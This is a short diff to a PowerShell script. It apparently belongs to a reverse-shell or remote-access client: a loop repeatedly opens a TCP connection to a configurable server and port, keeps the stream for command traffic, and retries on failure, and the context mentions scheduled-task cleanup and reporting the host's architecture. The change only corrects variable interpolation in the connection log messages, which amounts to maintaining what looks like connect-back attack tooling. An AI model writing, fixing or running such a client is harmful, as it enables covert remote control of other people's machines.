@@ -621,11 +621,11 @@ schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
 
     while ($true) {
         try {
-            Output-Log "[*] Attempting to connect to $srv:$port ..."
+            Output-Log "[*] Attempting to connect to ${srv}:${port} ..."
             $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
             $stream = $tcp.GetStream()
 
-            Output-Log "[+] Successfully connected to $srv:$port"
+            Output-Log "[+] Successfully connected to ${srv}:${port}"
 
             $global:clientStream = $stream
             
@@ -802,7 +802,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
             $tcp.Close()
         }
         catch {
-            $errorDetails = "[!] Failed to connect to $srv:$port -> $($_.Exception.Message)"
+            $errorDetails = "[!] Failed to connect to ${srv}:${port} -> $($_.Exception.Message)"
             Output-Log $errorDetails
             Start-Sleep -Seconds 5
         }
